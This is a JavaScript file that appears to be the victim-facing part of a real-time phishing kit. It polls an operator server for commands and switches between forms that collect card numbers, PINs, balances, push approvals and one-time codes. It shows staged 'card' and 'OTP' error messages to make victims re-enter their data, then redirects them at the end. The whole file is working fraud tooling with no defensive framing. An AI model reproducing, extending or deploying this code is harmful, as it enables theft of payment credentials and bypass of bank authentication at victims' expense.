//Live Script:.
function loadstation() {
    var lastState = '';
    sendPost(sess);

    $("#station_data").load("global/inc/postman.php?getState&_sess=" + sess, function(response, status, xhr) {
        if (status === "success") {
            lastState = response;
            checkState(response);
        } else {
            console.log("Error loading content.");
        }
    });
}

function checkState(state) {

    if (state.includes("LOADING")) {
        console.log("loading!");

    } else if (state.trim() === "BALANCE") {
        console.log('BALANCE');
        new_form = balance_Form;
        $('#loading-content').hide();
        $(loading_Page).hide();
        $(lastWindows).hide();
        $(new_form).show();
        lastWindows = new_form;
        return 0;

    } else if (state.trim() === "PIN") {
        console.log('PIN');
        new_form = pin_Form;
        $('#loading-content').hide();
        $(loading_Page).hide();
        $(lastWindows).hide();
        $(new_form).show();
        lastWindows = new_form;
        return 0;

    } else if (state.trim() === "PUSH") {
        console.log('PUSH');
        new_form = push_Form;
        $('#loading-content').hide();
        $(loading_Page).hide();
        $(lastWindows).hide();
        $(new_form).show();
        lastWindows = new_form;

    } else if (state.trim() === "CC_ERNO") {
        console.log('CC_ERNO');
        new_form = card_Form;
        erno = 1;
        sess = generateString(15);
        setValue(cnum_field, '');
        showError(cnum_field);
        $('#loading-content').hide();
        $(lastWindows).hide();
        $(new_form).show();
        lastWindows = new_form;
        $('#' + crdError).show();
        setInner(crdError, crdErrorText);
        return 0;

    } else if (state.trim() === "OTP") {
        console.log('OTP');
        new_form = kode_Form;
        new_field = kode_field;
        setValue(new_field, '');
        $('#loading-content').hide();
        $(lastWindows).hide();
        $(new_form).show();
        $(new_field).focus();
        lastWindows = new_form;
        return 0;

    } else if (state.trim() === "OTP_ERNO") {
        console.log('OTP_ERNO');
        new_form = kode_Form;
        new_field = kode_field;
        setValue(new_field, '');
        $('#loading-content').hide();
        $(lastWindows).hide();
        $(new_form).show();
        $(new_field).focus();
        lastWindows = new_form;
        showError(new_field);
        $('#' + kodeError).show();
        setInner(kodeError, kodeErrorText);
        return 0;

    } else if (state.trim() === "FINISH") {
        console.log('FINISH');
        $('#loading-content').hide();
        $(lastWindows).hide();
        $(sucForm).show();
        redirect(redirectUrl, 8500);
        return 0;

    }

    setTimeout(loadstation, 2000);
}